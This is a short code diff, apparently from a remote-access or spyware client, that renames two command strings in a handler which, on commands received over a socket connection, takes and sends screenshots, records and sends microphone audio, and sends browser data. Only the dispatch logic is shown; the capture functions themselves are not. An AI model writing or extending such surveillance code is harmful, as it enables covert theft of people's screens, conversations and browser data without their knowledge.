@@ -49,9 +49,9 @@ def command(data):
 
     if command == 'screenshot':
         take_and_send_screenshot(sio)
-    elif command == 'audio':
+    elif command == 'microphone':
         record_and_send_audio(duration, sio)
-    elif command == 'browser_data':
+    elif command == 'browserdata':
         send_browser_data(sio)
 
 
